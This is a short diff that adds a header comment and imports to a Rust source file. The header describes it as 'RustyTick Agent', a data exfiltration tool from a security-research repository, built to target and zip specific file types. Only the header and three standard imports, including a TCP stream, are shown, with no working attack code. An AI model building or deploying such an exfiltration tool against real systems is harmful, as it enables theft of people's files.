@@ -1,3 +1,18 @@
+// -------------------------------------------------------------------------
+// SECURITY RESEARCH & EDUCATIONAL PURPOSES ONLY
+// This script is part of the BugWare repository, a collection of security tools
+// and PoCs for learning about attack vectors.
+// DO NOT USE THIS FOR ILLEGAL PURPOSES.
+// -------------------------------------------------------------------------
+
+/*
+    Program: RustyTick Agent
+    Description: Rust-based data exfiltration tool designed to target and zip specific file types.
+    Author: CyberPanther232
+    Suite: BugWare
+    Version: 1.0
+*/
+
 use std::io::{self, Read, Write};
 use std::net::TcpStream;
 use std::fs;
